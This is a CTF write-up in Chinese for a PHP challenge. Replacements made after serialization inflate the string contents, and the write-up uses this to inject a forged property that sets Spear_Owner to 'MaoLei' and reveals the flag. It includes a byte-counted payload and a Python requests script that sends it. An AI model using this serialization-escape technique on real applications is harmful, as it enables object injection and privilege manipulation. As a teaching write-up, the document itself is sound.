# 夺命十三枪

## 题目简述

程序把可控的 `chant` 放进对象属性，先 `serialize()`，再对序列化文本执行 13 组 `str_replace()`，最后 `unserialize()` 并触发对象的 `__toString()`。只有当 `Spear_Owner === 'MaoLei'` 时，魔术方法才会返回环境变量中的 flag。

## 解题过程

初始对象有两个公开属性：

```php
class Omg_It_Is_So_Cool_Bring_Me_My_Flag {
    public $Chant = '';
    public $Spear_Owner = 'Nobody';
}
```

如果 `chant` 是纯 ASCII 的 80 字节，序列化片段会包含 `s:80:"..."`。关键在于替换发生在序列化之后，`s:80` 不会随内容长度更新。选择以下两种替换项：

```text
di_jiu_qiang  -> Night_Parade_of_a_Hundred_Ghosts
长度 12          长度 32，净增长 20

di_qi_qiang   -> Penetrating_Gaze
长度 11          长度 16，净增长 5
```

使用一次第一种和三次第二种，替换后总共增长

$$
20+3\times5=35
$$

字节。接着在 45 字节替换前缀后放入一个恰好 35 字节的伪造尾部：

```text
";s:11:"Spear_Owner";s:6:"MaoLei";}
```

完整输入是 80 字节：

```text
di_jiu_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}
```

替换后，前 45 字节被膨胀为 80 字节。`unserialize()` 按旧长度 `s:80` 只把膨胀后的招式名读作 `Chant`；伪造尾部开头的双引号正好成为字符串结束符，随后覆盖 `Spear_Owner` 并提前闭合对象。原对象中 `Nobody` 的剩余序列化文本落在已闭合对象之后，不再影响结果。

可直接让 HTTP 客户端负责 URL 编码：

```python
from argparse import ArgumentParser

import requests

parser = ArgumentParser()
parser.add_argument("url", help="题目入口 URL")
args = parser.parse_args()

payload = (
    "di_jiu_qiang"
    + "di_qi_qiang" * 3
    + '\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}'
)
assert len(payload.encode()) == 80

response = requests.get(args.url, params={"chant": payload})
print(response.text)
```

响应中的对象主体会变成：

```text
O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{
  s:5:"Chant";
  s:80:"Night_Parade_of_a_Hundred_GhostsPenetrating_GazePenetrating_GazePenetrating_Gaze";
  s:11:"Spear_Owner";s:6:"MaoLei";
}
```

随后 `echo unserialize($after)` 触发 `__toString()`，返回 `Omg You're So COOOOOL!!!` 和运行环境中的 flag。

## 方法总结

这是典型的 PHP 序列化字符串逃逸：先序列化、后替换，而且替换会改变字节长度，导致字符串长度字段与真实内容失配。构造时要严格按字节计算“膨胀量”和“注入尾部长度”，同时让尾部自行结束属性并闭合对象。
